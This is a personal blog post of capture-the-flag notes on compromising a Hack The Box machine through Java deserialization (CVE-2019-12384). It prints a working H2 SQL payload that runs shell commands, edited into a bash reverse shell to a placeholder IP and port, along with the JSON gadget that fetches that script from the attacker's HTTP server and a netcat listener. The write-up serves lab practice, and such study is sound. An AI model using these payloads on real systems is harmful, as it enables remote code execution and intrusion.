---
layout:     post
title:      Hackthebox Notes Java Deserialization Part 2
date:       2020-12-13
summary:    Second run on the next easiest medium-difficulty machine available on Hackthebox
categories: CTF
thumbnail: cogs
tags:
 - CTF
 - Hackthebox
---
Last night, I left off at...
{% highlight ruby %}
not sure if any specific CVE found has a specific exploit or PoC for this box, or if I'll have to research and roll my own  
appears that Java Deserialization is the hot topic and I am unsure if this is like SQLi where I just need to know how it works and experiment with it  
been reading for an hour about java deserialization to get a basic understanding of it  
found resource https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html  
pause for the night to spend time with wife  
{% endhighlight %}
This morning, I made my wife and myself some coffee, the kids are out of the house, and I launched back into the machine with a few hours still remaining.  
{% highlight ruby %}
reading though OWASP guide, found a deserialization cheat sheet and mention of burpsuite deserialization plugin  
loaded burp, went to BApp, found Java Deserialization extension, requires Burpsuite Pro, scratch that  
sent request through proxy...nothing unusual  
reading more about deserialization  
found CVE-2019-12384 exploit on github, reviewing code  
looks like i can modify the exploit and go from there  
cloning exploit repository...done
reviewing code...

contains inject.sql with a payload inside: 
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('id > exploited.txt')

so I modified last line from:  
CALL SHELLEXEC('id > exploited.txt')
to: 
CALL SHELLEXEC('setsid bash -i &>/dev/tcp/IP/PORT 0>&1 &')
in order to catch a shell in netcat.  

so now according to the exploit, i spawn an http server to host the exploit  
python2 -m SimpleHTTPServer  

created a netcat listener  
nc -nlvp 4444

pasted the following into http input form: 
["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://IP:PORT/inject.sql'"}]  

Immediately got a shell!  
whoami = pericles  
ps aux = crontab, apache servers, and more  
pulled user flag real quick and submitted  
googling for manual enumeration cheat sheets
heading out to a meeting, killed shell and HTB VPN
{% endhighlight %}
